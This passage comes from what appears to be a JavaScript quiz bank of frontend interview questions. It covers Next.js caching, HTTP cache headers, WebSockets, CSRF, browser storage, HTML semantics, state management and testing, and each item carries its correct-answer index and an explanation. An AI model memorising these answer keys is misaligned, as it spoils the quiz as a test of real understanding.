    { q: "What does revalidate = 60 do in a Server Component?", opts: ["Refreshes the page every 60 seconds", "ISR — the route's cached HTML is regenerated in the background when a request comes in after 60 seconds", "Sets a 60-second network timeout", "Clears the cache every 60 seconds"], correct: 1, explain: "export const revalidate = 60 enables ISR. The first request after 60s triggers background regeneration. The stale page is served immediately; the freshly generated page is stored for subsequent requests." },
    { q: "How do you opt out of caching for a specific fetch() in Next.js?", opts: ["fetch('/api', { noCache: true })", "fetch('/api', { cache: 'no-store' }) — fetches on every request", "fetch('/api', { revalidate: 0 })", "fetch.noCache('/api')"], correct: 1, explain: "fetch('/api/data', { cache: 'no-store' }) opts out of the Data Cache entirely — the fetch runs on every request. Equivalent to SSR behavior for that specific fetch." },
  ],

  'server-actions': [
    { q: "What are Next.js Server Actions?", opts: ["Express.js route handlers", "Async functions marked with 'use server' that run on the server when called from Client Components — like RPC", "WebSocket handlers", "Middleware functions"], correct: 1, explain: "Server Actions are async server-side functions exposed to the client. Marked with 'use server', they can be called directly from Client Components or form actions. They replace API routes for mutations." },
    { q: "What security concern must you address with Server Actions?", opts: ["They're inherently secure", "Server Actions are public HTTP endpoints — always validate inputs, check auth, and treat them like API routes", "CORS configuration", "SSL certificates"], correct: 1, explain: "Server Actions compile to HTTP endpoints. Anyone can call them directly. Always: validate all inputs, verify authentication/authorization, sanitize data. Don't trust the client even though they look like 'just functions'." },
  ],

  // PERFORMANCE
  'virtualization': [
    { q: "What is list virtualization?", opts: ["Converting lists to virtual DOM", "Only rendering items visible in the viewport, not all items in the list", "Caching list items in memory", "Using CSS to hide off-screen items"], correct: 1, explain: "Virtualization (windowing) only renders DOM nodes for visible items plus a small buffer. A list of 100,000 items only has ~20-30 DOM nodes at any time. This makes rendering fast regardless of total list size." },
  ],

  'memoization': [
    { q: "What is memoization?", opts: ["Writing code comments", "Caching the return value of a function for given inputs, so repeated calls with same args return cached result without recomputing", "Optimizing memory usage", "A type of garbage collection"], correct: 1, explain: "Memoization stores function results in a cache keyed by arguments. Pure functions (same input → same output) benefit most. Trade-off: memory for speed. Used in useMemo, useCallback, React.memo, and manual caches." },
    { q: "What is the key requirement for a function to be safely memoizable?", opts: ["It must be async", "It must be pure — same inputs always produce same outputs with no side effects", "It must use arrow syntax", "It must return an object"], correct: 1, explain: "Memoization only works correctly for pure functions. If a function reads from an external source (Date.now(), Math.random(), database) or has side effects, memoizing it would return stale/incorrect cached results." },
    { q: "When does useMemo actually improve performance?", opts: ["Always — it prevents re-computation", "Only when the computation is genuinely expensive (>1ms) AND the memoized value is used in ways that benefit from reference stability", "For any calculation with more than 2 steps", "Only for objects and arrays"], correct: 1, explain: "useMemo adds overhead: the comparison of deps array, storing the cached value, and the extra function call. For cheap calculations, this overhead exceeds the savings. Profile before memoizing." },
  ],

  'caching': [
    { q: "What does Cache-Control: max-age=3600 mean?", opts: ["Cache for 3600 bytes", "Browser can cache the resource for 3600 seconds (1 hour) without revalidating", "Server caches for 3600ms", "CDN caches for 3600 requests"], correct: 1, explain: "max-age=3600 tells the browser: this response is fresh for 3600 seconds. During that time, subsequent requests are served from cache without any network request. After 3600s, the browser revalidates with the server." },
    { q: "What is the difference between max-age and s-maxage?", opts: ["They are identical", "max-age applies to browser cache; s-maxage applies to shared caches (CDN, proxies)", "s-maxage is for service workers", "max-age is deprecated"], correct: 1, explain: "max-age controls browser (private) cache duration. s-maxage controls shared caches like CDN edge nodes. If both are present, CDNs use s-maxage; browsers use max-age. Allows different caching durations for browser vs CDN." },
    { q: "What does stale-while-revalidate do?", opts: ["Serves stale content forever", "Serves cached content immediately while fetching fresh content in the background — fast response + eventually fresh", "Invalidates the cache while updating", "A React Query feature only"], correct: 1, explain: "Cache-Control: max-age=60, stale-while-revalidate=300 means: serve cached content for 60s (fresh), then serve stale for up to 300 more seconds while revalidating in the background. Users get instant responses always." },
    { q: "What is an ETag?", opts: ["An HTML tag for external content", "A response header with a hash/version of the content — browser sends it back to ask 'has this changed?' (304 if not)", "A cache eviction strategy", "An encryption tag"], correct: 1, explain: "Server sends ETag: 'abc123'. Browser stores it. Next request: If-None-Match: 'abc123'. If content unchanged, server returns 304 Not Modified (no body) — saves bandwidth. If changed, sends new content + new ETag." },
    { q: "What cache headers should static assets with hashed filenames use?", opts: ["no-cache", "Cache-Control: max-age=31536000, immutable — cache forever since the filename changes when content changes", "Cache-Control: max-age=3600", "Pragma: no-cache"], correct: 1, explain: "Hashed filenames (main.a3f9c2.js) guarantee: same URL = same content always. Cache forever with immutable (tells browsers don't even try to revalidate). When content changes, the URL changes, so users always get fresh code." },
  ],

  'websockets': [
    { q: "What is the key difference between WebSocket and HTTP?", opts: ["WebSocket is faster", "WebSocket is a persistent bidirectional connection; HTTP is request-response where server can't push without client request", "WebSocket uses UDP", "HTTP is newer"], correct: 1, explain: "WebSocket establishes a persistent TCP connection. Both client and server can send messages at any time (full-duplex). HTTP is half-duplex: client requests, server responds — server can't push unsolicited messages (without SSE or polling)." },
    { q: "What is the difference between WebSocket and Server-Sent Events (SSE)?", opts: ["SSE is newer", "WebSocket is bidirectional; SSE is server-to-client only but simpler, uses HTTP/2, and auto-reconnects", "They are identical", "SSE requires special servers"], correct: 1, explain: "SSE is one-directional (server → client) over regular HTTP. Simpler to implement, auto-reconnects, works through HTTP/2 multiplexing. Use SSE for notifications/feeds. Use WebSocket when client also needs to send data frequently." },
    { q: "What is long polling?", opts: ["Polling with a long interval", "Client makes request; server holds it open until data is available, then responds; client immediately re-requests", "HTTP/2 server push", "WebSocket fallback"], correct: 1, explain: "Long polling: client requests → server holds response open → when data arrives, server responds → client immediately sends another request. Simulates server push with regular HTTP. Inefficient but universally compatible." },
    { q: "When should you choose WebSocket over SSE?", opts: ["Always — WebSocket is better", "When you need bidirectional communication (chat, games, collaborative editing where client also sends frequent data)", "For simple notifications", "When SSE isn't supported"], correct: 1, explain: "SSE is simpler and sufficient for server-push scenarios (live feeds, notifications, progress updates). Use WebSocket when: clients send frequent data (chat messages, game inputs, collaborative edits, real-time cursor positions)." },
  ],

  'csrf': [
    { q: "What is a CSRF attack?", opts: ["Cross-Site Request Forgery — attacker tricks authenticated users into making unintended requests to your server", "A type of XSS attack", "A SQL injection variant", "A DDoS technique"], correct: 0, explain: "CSRF exploits the fact that browsers automatically send cookies with cross-origin requests. Evil site makes an img or form that sends authenticated requests to bank.com. The browser includes the auth cookie automatically." },
    { q: "How does SameSite=Strict cookie attribute prevent CSRF?", opts: ["It encrypts cookies", "Browser won't send the cookie on cross-site requests at all — attacker's fake request has no authentication", "It validates the cookie signature", "It limits which domains can set cookies"], correct: 1, explain: "SameSite=Strict: cookie is never sent on cross-site requests. Attacker's form on evil.com POSTing to bank.com won't include the session cookie. Bank server sees no authentication and rejects the request." },
    { q: "What is the Double Submit Cookie pattern for CSRF protection?", opts: ["Setting two session cookies", "Set a non-httpOnly CSRF token in cookie; client reads it and sends in header — server validates both match", "Using two-factor authentication", "Submitting forms twice"], correct: 1, explain: "Server sets csrfToken cookie (readable by JS). Client reads it and includes in X-CSRF-Token header. Server verifies cookie value matches header value. Attacker can't read the cookie due to same-origin policy, so can't set the header." },
    { q: "Why does SameSite=Lax still allow some cross-site requests?", opts: ["It's a misconfiguration", "Lax allows GET requests from top-level navigation (clicking links) but blocks POST and other state-changing requests", "Lax only blocks third-party cookies", "Lax is deprecated"], correct: 1, explain: "SameSite=Lax: cookies are sent when navigating to the site (clicking a link) but not on cross-origin sub-resource requests (images, frames, XHR). This allows normal link navigation while blocking most CSRF attack vectors." },
  ],

  // BROWSER
  'rendering-pipeline': [
    { q: "What is the Critical Rendering Path?", opts: ["The CSS path that causes reflows", "The sequence: HTML parsing → DOM → CSSOM → Render Tree → Layout → Paint → Composite", "The JavaScript execution order", "The order of HTTP requests"], correct: 1, explain: "The Critical Rendering Path is the sequence of steps the browser takes to convert HTML/CSS/JS into pixels. Optimizing it improves First Contentful Paint (FCP) and Largest Contentful Paint (LCP)." },
    { q: "What is render-blocking?", opts: ["JavaScript that throws an error", "Resources (CSS, synchronous scripts) that pause HTML parsing and rendering until they're downloaded and processed", "Animations that block other animations", "CSS that prevents scrolling"], correct: 1, explain: "External CSS and synchronous <script> tags block rendering — the browser won't display anything until they're downloaded and processed. Fix: async/defer for scripts, inline critical CSS, lazy-load non-critical CSS." },
    { q: "What does 'compositing' mean in the rendering pipeline?", opts: ["Combining JavaScript files", "GPU assembles layers into the final screen image — happens after paint, handled by separate compositor thread", "CSS preprocessing", "Image compression"], correct: 1, explain: "After painting, the browser's compositor thread combines layers into the final frame. Transformations and opacity changes can be handled entirely by the compositor (no layout or paint) — this is why they're the cheapest to animate." },
    { q: "What property forces a new compositor layer?", opts: ["z-index: 999", "will-change: transform or transform: translateZ(0) — hints to browser to promote element to own compositor layer", "position: absolute", "overflow: hidden"], correct: 1, explain: "will-change: transform (or the old hack transform: translateZ(0)) tells the browser 'this element will animate' — it gets its own GPU layer. Compositing only, no layout/paint during animation. Use sparingly — too many layers waste GPU memory." },
  ],

  'storage': [
    { q: "What is the key difference between localStorage and sessionStorage?", opts: ["localStorage is larger", "localStorage persists until explicitly cleared; sessionStorage is cleared when the tab/window closes", "sessionStorage is encrypted", "localStorage is async"], correct: 1, explain: "Both are synchronous key-value stores. localStorage persists across sessions (browser restarts). sessionStorage is scoped to the browser tab and cleared when it closes. Neither is available in Web Workers." },
    { q: "What are the security concerns with localStorage?", opts: ["It can overflow the disk", "Accessible by any JavaScript on the page — XSS attacks can steal all localStorage data", "It's unencrypted network traffic", "It expires tokens automatically"], correct: 1, explain: "localStorage is accessible to any JavaScript on your domain. An XSS vulnerability gives attackers full access to read, write, and delete all localStorage data. Never store sensitive tokens or credentials in localStorage." },
    { q: "When should you use IndexedDB over localStorage?", opts: ["Always — IndexedDB is better", "For large structured data (>5MB), binary data, or when you need complex queries, transactions, or indexes", "IndexedDB is the same as localStorage", "Only for offline apps"], correct: 1, explain: "localStorage: simple key-value, synchronous, ~5-10MB limit. IndexedDB: complex structured data, async, transactional, can store files/blobs, gigabytes of storage. Use IndexedDB for offline data, large datasets, or binary content." },
    { q: "What is the difference between cookies and localStorage?", opts: ["Only size — cookies are smaller", "Cookies are sent with HTTP requests (available to server); localStorage stays in browser (client-only). Cookies can have expiry, httpOnly, Secure flags", "localStorage supports expiry; cookies don't", "Cookies are encrypted by default"], correct: 1, explain: "The critical difference: cookies are automatically sent with every HTTP request to the server. localStorage never leaves the browser. Use httpOnly cookies for auth tokens (XSS-safe). Use localStorage for client-only preferences." },
  ],

  // HTML
  'semantic-html': [
    { q: "Why are semantic HTML elements important?", opts: ["They load faster", "They convey meaning to browsers, screen readers, and search engines — improving accessibility and SEO", "They apply default styling", "They reduce JavaScript code"], correct: 1, explain: "Semantic elements (<header>, <nav>, <main>, <article>, <section>, <aside>, <footer>) tell browsers and assistive technologies WHAT the content is, not just how it should look. Screen readers use them for navigation; search engines use them for relevance." },
    { q: "What is the difference between <section> and <div>?", opts: ["section has default CSS", "section is semantic — indicates a thematic grouping with a heading; div is a generic non-semantic container", "section is block-level, div is inline", "They are identical"], correct: 1, explain: "<div> has no meaning — it's a styling hook. <section> signals a standalone thematic content block that would make sense in an outline. Use section when content has its own heading and could appear standalone." },
    { q: "When should you use <article> vs <section>?", opts: ["They are interchangeable", "article for self-contained content that makes sense in isolation (blog post, tweet, product card); section for thematic grouping of related content", "article is for news, section for apps", "section is newer and replaces article"], correct: 1, explain: "<article> = could be syndicated/shared independently (blog post, comment, card). <section> = a thematic part of a larger document. An article can contain sections; a section can contain articles." },
    { q: "What does the <main> element tell browsers?", opts: ["It styles the main content area", "It identifies the dominant content of the document — there should be only one, and screen readers use it for 'skip to content'", "It creates the main layout grid", "It must wrap all body content"], correct: 1, explain: "<main> marks the primary content — the core purpose of the page, excluding headers, footers, sidebars, and navigation. Screen readers provide 'skip to main content' functionality using this landmark. Only one <main> per page." },
    { q: "What HTML element should you use for navigation?", opts: ["<div class='nav'>", "<nav> — semantic navigation landmark used by screen readers to identify navigation regions", "<ul> with links only", "<header> with links"], correct: 1, explain: "<nav> is a landmark element that groups navigation links. Screen readers announce it and allow users to jump to/past navigation. You can have multiple <nav> elements (main nav, breadcrumbs, sidebar nav) with aria-label to differentiate." },
  ],

  'async-defer': [
    { q: "What happens when a browser encounters a <script> tag without async or defer?", opts: ["It continues parsing and executes the script later", "HTML parsing pauses, script is downloaded and executed, then parsing resumes — render-blocking", "The script is ignored", "The script runs in a Web Worker"], correct: 1, explain: "A plain <script> blocks HTML parsing. The browser stops building the DOM, downloads the script, executes it completely, then resumes parsing. This delays rendering and should be avoided for non-critical scripts." },
    { q: "What is the difference between async and defer?", opts: ["async is faster", "async executes immediately after download (may interrupt parsing); defer executes after HTML is fully parsed, before DOMContentLoaded, in order", "defer is newer than async", "They are identical"], correct: 1, explain: "async: script downloads while HTML parses, then executes immediately (interrupts parsing). Order not guaranteed. defer: script downloads while HTML parses, executes after parsing completes (before DOMContentLoaded), in document order." },
    { q: "When should you use defer vs async?", opts: ["Always use async — it's faster", "defer for scripts that depend on the DOM or other scripts (order matters); async for independent scripts like analytics", "async for small scripts, defer for large", "defer is for ES modules only"], correct: 1, explain: "async is perfect for independent scripts (analytics, ads) where order doesn't matter. defer is for scripts that need the DOM to be ready or depend on other scripts in order (main app bundle, libraries in sequence)." },
    { q: "Where should <script> tags with defer be placed?", opts: ["In <head> — defer makes placement irrelevant since it waits for DOM", "Anywhere — defer and async work best in <head> so download starts early", "Before </body> only", "In <head> is required, not optional"], correct: 0, explain: "With defer, place scripts in <head>. They download early (parallel with HTML parsing) but execute after parsing completes. This is better than placing at </body> because downloading starts earlier." },
  ],

  'critical-rendering': [
    { q: "What resources block the Critical Rendering Path?", opts: ["Images and fonts", "CSS (always blocks rendering) and synchronous JavaScript (blocks parsing)", "Video files", "Web fonts only"], correct: 1, explain: "CSS blocks rendering — the browser builds CSSOM before rendering anything. Sync scripts block parsing AND rendering. Images, fonts, and async scripts don't block the initial render path." },
    { q: "What is 'critical CSS'?", opts: ["CSS with !important", "The minimum CSS needed to render above-the-fold content — inlined in <head> to avoid a blocking CSS request", "CSS for critical features only", "Minified CSS"], correct: 1, explain: "Critical CSS is the above-the-fold CSS extracted and inlined in the <head>. The page renders immediately without waiting for an external CSS file. Non-critical CSS loads asynchronously after. Tools: critical, Critters (webpack)." },
    { q: "What does DOMContentLoaded event mean vs load event?", opts: ["They fire at the same time", "DOMContentLoaded: HTML parsed, DOM ready (no images/CSS); load: everything including images, CSS, fonts is loaded", "load fires first", "DOMContentLoaded includes deferred scripts"], correct: 1, explain: "DOMContentLoaded fires when HTML is parsed and deferred scripts run — good for DOM manipulation. window.load fires when everything (images, stylesheets, fonts) is loaded. Most code should listen for DOMContentLoaded, not load." },
    { q: "How does preloading resources improve the Critical Rendering Path?", opts: ["It compresses the resources", "<link rel='preload'> fetches high-priority resources early, preventing late discovery during parsing from delaying render", "It caches resources", "It minifies resources"], correct: 1, explain: "Without preload, the browser discovers fonts/images/late-loaded CSS only when parsing reaches them. <link rel='preload'> fetches them at the highest priority immediately, so they're ready when needed — reducing render-blocking delays." },
  ],

  'web-components-html': [
    { q: "What are the three main technologies in Web Components?", opts: ["HTML, CSS, JavaScript", "Custom Elements, Shadow DOM, and HTML Templates (<template> and <slot>)", "React, Vue, Angular", "WebAssembly, Workers, and Service Workers"], correct: 1, explain: "Web Components are built on: Custom Elements (define new HTML tags), Shadow DOM (encapsulated styling and DOM), and HTML Templates (<template> for inert HTML, <slot> for content insertion)." },
    { q: "What problem does Shadow DOM solve?", opts: ["JavaScript performance", "CSS encapsulation — styles inside Shadow DOM don't leak out; global styles don't leak in (by default)", "Component rendering speed", "Event handling isolation"], correct: 1, explain: "Shadow DOM creates an isolated DOM subtree with its own styling scope. A button's internal styles don't affect page styles and vice versa. This prevents CSS conflicts in component libraries and widgets." },
    { q: "What is the difference between customElements.define() and extending HTMLElement?", opts: ["They are different names for same thing", "You must extend HTMLElement (or a specific element) when calling customElements.define to create a custom element class", "Only one is standards-compliant", "customElements.define is deprecated"], correct: 1, explain: "customElements.define('my-element', MyElementClass) registers a custom element. MyElementClass must extend HTMLElement (or HTMLButtonElement, etc.). The class defines lifecycle callbacks (connectedCallback, disconnectedCallback, attributeChangedCallback)." },
  ],

  'shadow-dom': [
    { q: "What is the difference between open and closed Shadow DOM?", opts: ["open is faster", "open: shadowRoot accessible via element.shadowRoot; closed: shadowRoot is null from outside (inaccessible to JavaScript)", "closed is more performant", "They are identical"], correct: 1, explain: "attachShadow({ mode: 'open' }): element.shadowRoot returns the shadow root — accessible from outside. mode: 'closed': element.shadowRoot is null. Closed mode prevents external JavaScript from accessing/modifying internals." },
    { q: "How does styling work across Shadow DOM boundaries?", opts: ["Global CSS applies everywhere", "By default, styles are encapsulated. CSS custom properties (variables) pierce Shadow DOM boundaries; ::part() allows styling specific exposed parts", "CSS can't style Shadow DOM", "Only inline styles work in Shadow DOM"], correct: 1, explain: "Styles inside Shadow DOM don't affect outside; global styles don't affect inside (by default). Exceptions: CSS custom properties (variables) pierce boundaries. ::part() lets component expose styling hooks. :host() styles the host element." },
  ],

  'meta-performance': [
    { q: "What is the difference between preload and prefetch?", opts: ["prefetch is faster", "preload: fetch high-priority resource for CURRENT navigation; prefetch: low-priority fetch for FUTURE navigation", "They are identical", "preload is for scripts, prefetch is for images"], correct: 1, explain: "<link rel='preload'>: high priority, for current page resources needed soon (LCP image, critical font). <link rel='prefetch'>: low priority, for resources the user might need on the NEXT page. Prefetch doesn't block anything." },
    { q: "What does <link rel='preconnect'> do?", opts: ["Downloads the resource", "Establishes the TCP/TLS connection to an origin early, reducing connection latency when resources are actually requested", "Caches DNS responses", "Prefetches the entire origin's resources"], correct: 1, explain: "preconnect does the DNS lookup, TCP handshake, and TLS negotiation early — before the resource is actually requested. When the request happens, the connection is already warm. Useful for CDNs, Google Fonts, API origins." },
    { q: "What does dns-prefetch do and how does it differ from preconnect?", opts: ["They are identical", "dns-prefetch only resolves DNS; preconnect does DNS + TCP + TLS. dns-prefetch uses fewer resources", "preconnect only does DNS", "dns-prefetch is deprecated"], correct: 1, explain: "dns-prefetch resolves the DNS lookup only (~20-60ms saving). preconnect does DNS + TCP + TLS handshake (saves more time but uses resources). Use preconnect for critical origins, dns-prefetch as fallback for older browsers." },
    { q: "What is fetchpriority='high' used for?", opts: ["Making fetch() calls faster", "Hints to browser to load a resource at high priority — critical for LCP images to load before other images", "Bypassing cache", "Making JavaScript execute first"], correct: 1, explain: "fetchpriority='high' on an img, link, or script hints to the browser's resource prioritization algorithm to fetch it at high priority. Essential for LCP images — ensures the hero image isn't deprioritized behind other resources." },
  ],

  // ARCHITECTURE
  'component-design': [
    { q: "What is the composition pattern in React component design?", opts: ["Combining CSS classes", "Building complex UIs from small, focused components rather than building large monolithic components", "Using React.compose()", "Extending class components"], correct: 1, explain: "Composition: <Card><CardHeader/><CardBody/><CardFooter/></Card> rather than <Card header={...} body={...} footer={...}/>. More flexible, allows customization, avoids prop explosion, and keeps components single-responsibility." },
    { q: "What is the 'prop explosion' problem?", opts: ["Too many events", "A component accumulates dozens of props as requirements grow, becoming hard to use and maintain", "Props that throw errors", "Too many re-renders from props"], correct: 1, explain: "Prop explosion: <Button size='sm' color='blue' disabled loading leftIcon={} rightIcon={} onClick={} onHover={} .../>. Signs a component is doing too much. Fix: split into smaller components or use compound components." },
    { q: "What is inversion of control in component design?", opts: ["A React hook", "The parent controls what children render rather than the component controlling everything internally", "A design pattern for Redux", "CSS controlling JavaScript"], correct: 1, explain: "Inversion of control: instead of a Table component with many rendering props, expose the raw data and let the parent decide how to render. The parent has control; the component provides structure. Leads to more flexible, reusable components." },
  ],

  'micro-frontends': [
    { q: "What is a micro-frontend architecture?", opts: ["Very small React components", "An architectural pattern where a frontend application is decomposed into smaller, independently deployable frontend applications", "Minimal CSS frameworks", "Mobile-first design"], correct: 1, explain: "Micro-frontends extend microservices thinking to the frontend. Different teams own different parts of the UI, built with potentially different frameworks, deployed independently. The shell app composes them together." },
    { q: "What is Module Federation in Webpack?", opts: ["Separating CSS modules", "A Webpack 5 feature allowing multiple builds to share code/components at runtime without reimporting", "A way to split one bundle into modules", "Federation between different CDNs"], correct: 1, explain: "Module Federation lets separate Webpack builds expose and consume components from each other at runtime. Team A's checkout app can consume Team B's product card component without building it into their own bundle." },
    { q: "What is the main challenge with micro-frontends?", opts: ["They are hard to code", "Shared state, consistent styling/UX, team coordination, performance overhead from multiple frameworks, and integration complexity", "They require special browsers", "They can't use React"], correct: 1, explain: "Micro-frontends add complexity: sharing auth state between apps, maintaining consistent design systems, coordinating releases, avoiding duplicate dependencies (multiple React versions), and ensuring good performance despite the overhead." },
    { q: "When should you NOT use micro-frontends?", opts: ["For large enterprises", "For small-to-medium teams where the coordination overhead exceeds the benefits — if one team owns the whole frontend, monorepo + good structure is better", "For e-commerce", "When using React"], correct: 1, explain: "Micro-frontends solve an organizational scaling problem (multiple independent teams). If you have one team, the coordination overhead, complexity, and performance costs outweigh benefits. Use a well-structured monorepo instead." },
  ],

  'design-system': [
    { q: "What are design tokens?", opts: ["NFT tokens for designers", "Platform-agnostic design decisions (colors, spacing, typography) stored as variables — the single source of truth for design", "JWT tokens used in design", "CSS custom properties only"], correct: 1, explain: "Design tokens are named values for design decisions: --color-primary: #0070f3, --spacing-4: 16px, --font-heading: 'Inter'. They're platform-agnostic (can compile to CSS vars, iOS constants, Android dimens) and create consistency across products." },
    { q: "What is the difference between a component library and a design system?", opts: ["They are the same", "A component library is the coded components; a design system also includes design tokens, guidelines, patterns, documentation, and accessibility standards", "Design systems are for Figma only", "Component libraries are for React only"], correct: 1, explain: "A component library is a subset. A design system encompasses: design principles, brand guidelines, design tokens, component specifications, coded components, documentation, accessibility standards, and contribution guidelines." },
    { q: "What is Storybook used for in design systems?", opts: ["Writing CSS stories", "Developing and documenting UI components in isolation — shows all variants, states, and props in a browsable catalog", "Managing design tokens", "Testing accessibility automatically"], correct: 1, explain: "Storybook lets you develop components in isolation (no app setup needed), document all variants (Button: primary/secondary/danger/disabled), write interaction tests, and create a living documentation site for the design system." },
  ],

  // STATE MANAGEMENT
  'redux-arch': [
    { q: "What is the core Redux pattern?", opts: ["Components directly modify the store", "Unidirectional data flow: Action → Reducer → Store → View → Action", "Two-way data binding", "Observer pattern with automatic updates"], correct: 1, explain: "Redux enforces one-way data flow: dispatch(action) → reducer computes new state → store updates → connected components re-render → user triggers action. Predictable, debuggable, time-travelable." },
    { q: "What is Redux middleware used for?", opts: ["CSS styling in Redux", "Intercepting actions before they reach reducers — used for async operations, logging, crash reporting", "Defining reducers", "Connecting components to the store"], correct: 1, explain: "Middleware sits between dispatch and the reducer. Redux Thunk lets you dispatch functions (for async), Redux Saga handles complex side effects with generators, and custom middleware can log, validate, or transform actions." },
    { q: "What does Redux Toolkit's createSlice do?", opts: ["Splits the store into pieces", "Generates actions, action creators, and reducer for a 'slice' of state automatically — eliminating Redux boilerplate", "Creates a new Redux store", "Splits the bundle"], correct: 1, explain: "createSlice combines createAction + createReducer. Define name, initialState, and reducers object — RTK auto-generates action creators and handles Immer-based immutable updates. Eliminates most Redux boilerplate." },
    { q: "What is the purpose of normalizing state in Redux?", opts: ["Making state smaller", "Storing entities as {ids: [], entities: {id: item}} to eliminate duplication and make lookups O(1)", "Alphabetically sorting state", "Flattening nested arrays"], correct: 1, explain: "Normalized state prevents: storing the same user object in 5 different places, expensive array searches, and update bugs (updating user in one place but not others). Redux Toolkit's createEntityAdapter automates normalization." },
    { q: "What is the key mental shift from Redux to React Query for data fetching?", opts: ["React Query is just Redux with different names", "Redux is for client state; React Query is for server/async state — different problems requiring different tools", "React Query replaces all Redux needs", "Redux is deprecated"], correct: 1, explain: "Putting API data in Redux conflates server state (async, potentially stale, needs revalidation) with client state (synchronous, owned by the app). React Query handles server state concerns (caching, background refresh, stale data) that Redux requires manual implementation of." },
  ],

  'zustand-vs-redux': [
    { q: "What is the main philosophical difference between Zustand and Redux?", opts: ["Zustand is newer", "Redux enforces strict patterns (actions, reducers, immutability); Zustand is minimal and unopinionated — update state directly", "Zustand has better performance always", "Redux supports TypeScript, Zustand doesn't"], correct: 1, explain: "Redux: dispatch({type:'INCREMENT'}) → pure reducer → new state. Zustand: set(state => state.count++) directly. Zustand has no boilerplate — just create a store with state and actions together." },
    { q: "How does Zustand prevent unnecessary re-renders?", opts: ["It doesn't — same as Context", "Components subscribe to specific slices via selector: useStore(state => state.count) — only re-renders when count changes", "It memoizes all components automatically", "Using shouldComponentUpdate"], correct: 1, explain: "useStore(state => state.count) subscribes only to count. If other parts of the store change, this component doesn't re-render. Unlike Context where ALL consumers re-render on any value change." },
    { q: "When would you still choose Redux over Zustand?", opts: ["Never — Zustand is always better", "For large teams needing strict conventions, time-travel debugging, complex middleware, existing Redux ecosystem, or when Redux DevTools integration is critical", "For smaller state needs", "For TypeScript projects"], correct: 1, explain: "Redux shines for: large teams needing enforced patterns, complex async flows (Sagas), sophisticated middleware chains, time-travel debugging, or when already in a Redux codebase. Zustand is better for simpler cases and smaller teams." },
  ],

  'react-query-vs-redux': [
    { q: "What is 'server state' and why does it need special handling?", opts: ["State stored on the server only", "Data that lives on the server and is fetched async — it can become stale, needs caching, revalidation, and loading/error states", "Redux state saved to localStorage", "Next.js server-side props"], correct: 1, explain: "Server state characteristics: it's async (need loading states), can be stale (server data changes), needs caching (avoid refetching on every mount), needs background refresh. useState handles none of these — React Query handles all of them." },
    { q: "What does stale-while-revalidate mean in React Query?", opts: ["Showing errors while loading", "Return cached data immediately (stale), then fetch fresh data in background and update", "Blocking UI until fresh data arrives", "Deleting stale cache entries"], correct: 1, explain: "React Query serves cached data immediately (fast user experience), then silently fetches fresh data. When fresh data arrives, UI updates. Users see immediate content while getting fresh data — best of both worlds." },
    { q: "What problem does React Query's query deduplication solve?", opts: ["Duplicate React components", "If 5 components mount simultaneously and request the same query, only ONE network request fires", "Duplicate Redux actions", "Multiple renders of the same component"], correct: 1, explain: "React Query deduplicates identical queries. If ProfileHeader, ProfileBody, and ProfileStats all use useQuery(['user', id]), only ONE fetch fires. All three components share the same cached result — no coordination needed." },
  ],

  'optimistic-updates': [
    { q: "What is an optimistic update?", opts: ["An update that always succeeds", "Updating the UI immediately before server confirmation, assuming success, and rolling back if it fails", "An update with error handling", "A React 18 concurrent feature"], correct: 1, explain: "Optimistic UI: when user likes a post, immediately show 1 more like and flip the button — before the API responds. If the request fails, roll back to the original state and show an error. Creates instant-feeling interactions." },
    { q: "What is the main risk of optimistic updates?", opts: ["They're slower", "The UI shows a state that the server ultimately rejected — must implement rollback/error handling", "They cause re-renders", "They break SSR"], correct: 1, explain: "If the server rejects the update (validation error, auth failure, conflict), the UI shows the wrong state until rollback. Good optimistic update code stores previous state and restores it on failure, with a user-facing error message." },
    { q: "How does React Query's onMutate handle optimistic updates?", opts: ["It prevents mutations", "Cancel in-flight queries, snapshot current data, apply optimistic update, return snapshot for rollback in onError", "Automatically handles all rollbacks", "It's for synchronous updates only"], correct: 1, explain: "React Query pattern: onMutate cancels refetches (prevent overwriting), snapshots current cache, applies optimistic update to cache. onError receives snapshot and calls queryClient.setQueryData(key, snapshot) to roll back. onSettled refetches." },
  ],

  'normalized-state': [
    { q: "What is normalized state?", opts: ["State with consistent naming", "Storing entities as a flat structure: { ids: ['1','2'], entities: { '1': {id:'1',...} } } — each entity stored once", "Sorting state alphabetically", "Compressing state to save memory"], correct: 1, explain: "Normalization: instead of [{id:1,name:'Alice',...}, {id:1,name:'Alice',...}] in multiple places, store once in entities: {'1': {id:1,name:'Alice'}} with an ids array. Single source of truth prevents sync bugs." },
    { q: "What does Redux Toolkit's createEntityAdapter provide?", opts: ["Database ORM functionality", "Pre-built normalized state structure with CRUD operations: addOne, updateOne, removeOne, setAll, selectById, selectAll", "Automatic API integration", "React Query integration"], correct: 1, explain: "createEntityAdapter generates a normalized {ids, entities} state and provides: adapter.addOne(state, entity), adapter.updateOne(state, {id, changes}), adapter.removeOne(state, id), plus memoized selectors. Eliminates boilerplate normalization code." },
  ],

  'stale-while-revalidate': [
    { q: "What does the HTTP Cache-Control: stale-while-revalidate header mean?", opts: ["The response is invalid", "Serve stale (cached) content immediately, then fetch fresh content in the background for the next request", "Revalidate before serving", "Never serve stale content"], correct: 1, explain: "Cache-Control: max-age=60, stale-while-revalidate=300 means: fresh for 60s, then serve stale for up to 300s while background-revalidating. Users always get instant response; content eventually becomes fresh." },
    { q: "How does SWR (React library) implement stale-while-revalidate?", opts: ["It uses the HTTP header", "Returns cached data immediately (stale), then fetches and updates when fresh data arrives", "It only shows loading spinners", "It blocks until fresh data is available"], correct: 1, explain: "SWR by Vercel: immediately shows cached data, silently revalidates in background. No loading spinner for cached data — instant display. When revalidation completes, UI updates to fresh data. This is the core SWR behavior." },
  ],

  // TESTING
  'testing-pyramid': [
    { q: "What is the testing pyramid?", opts: ["A ranking of test importance", "A model suggesting many unit tests, fewer integration tests, and fewest E2E tests — balancing confidence, speed, and cost", "A JavaScript testing framework", "The order to write tests"], correct: 1, explain: "Unit tests: fast, cheap, many. Integration tests: medium speed/cost, moderate count. E2E tests: slow, expensive, few. The pyramid suggests investing most in cheap fast unit tests, using E2E for critical user journeys only." },
    { q: "What does the 'testing trophy' (Kent C. Dodds) suggest differently from the pyramid?", opts: ["More unit tests than E2E", "Emphasize integration tests most — they give the best confidence-to-cost ratio for frontend", "Remove unit tests entirely", "Only write E2E tests"], correct: 1, explain: "The Testing Trophy inverts the pyramid for frontend: fewer static analysis (TypeScript covers this), some unit tests, MANY integration tests (render component + user interactions), few E2E. Integration tests give best ROI." },
